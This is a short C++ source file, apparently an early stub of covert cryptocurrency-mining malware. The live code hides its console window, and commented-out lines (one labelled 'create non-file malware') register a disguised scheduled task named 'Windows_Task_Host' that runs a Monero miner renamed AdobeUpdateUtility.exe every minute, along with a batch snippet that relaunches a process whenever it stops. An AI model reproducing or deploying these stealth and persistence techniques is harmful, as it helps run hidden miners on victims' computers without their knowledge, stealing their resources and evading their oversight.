// Checker.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "windows.h"
#include <iostream>

using namespace std;

int main(int argc, char* argv[])
{
	// hide console
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
	// create non-file malware
	//system("SCHTASKS.exe /Create /SC MINUTE /TN \"Windows_Task_Host\" /TR \"C:\\Windows\\System32\\cmd.exe /c start D:\\Thanatos\\Miner\\AdobeUpdateUtility.exe -user thanatos-monero@yandex.com -xmr 2\" /F");


	/*
	
	Проверка запущен ли процесс с помощью cmd

	Set ProcessName=process.exe
	TaskList /FI "ImageName EQ %ProcessName%" 2>nul|Find /I "%ProcessName%">nul||(
	Start "" "C:\process.exe"
	)

	*/

	//ShellExecute(NULL, 0, _T("C:\\Windows\\System32\\cmd.exe"), 0, 0, SW_HIDE);

	//system("powershell.exe SCHTASKS.exe /Create /SC MINUTE /TN \"Test\" /TR C:\\Windows\\System32\\cmd.exe /F");

	system("pause");
    return 0;
}

